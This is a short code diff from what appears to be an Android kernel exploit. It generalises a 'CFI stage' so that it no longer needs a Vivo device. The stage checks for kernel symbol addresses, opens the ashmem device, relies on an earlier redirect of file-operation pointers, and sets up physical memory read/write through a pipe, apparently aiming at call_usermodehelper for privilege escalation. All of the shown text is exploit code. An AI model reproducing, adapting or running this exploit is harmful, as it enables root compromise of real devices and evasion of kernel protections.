@@ -228,18 +228,17 @@ void do_pselect_fake_lock_route(void) {
 }
 
 int try_cfi_stage(void) {
-  if (!is_vivo()) return 0;
-  if (!ASHMEM_MISC_FOPS) return 0;
+  if (!ASHMEM_MISC_FOPS || !SYSTEM_UNBOUND_WQ ||
+      !CALL_USERMODEHELPER_EXEC_WORK) return 0;
 
   init_ashmem_path();
   int ash_fd = open_ashmem_device();
   if (ash_fd < 0) {
-    pr_warning("Vivo: failed to open ashmem device\n");
+    pr_warning("CFI: failed to open ashmem device\n");
     return 0;
   }
 
-  // Initial fops redirect is already done in main.c via do_one_write(..., 4).
-  // Now we can use ash_fd to perform advanced operations.
+  /* Initial fops redirect is performed by main.c via mode 4. */
   
   cfi_stage_done = 1;
   if (install_pipe_physrw(ash_fd)) {
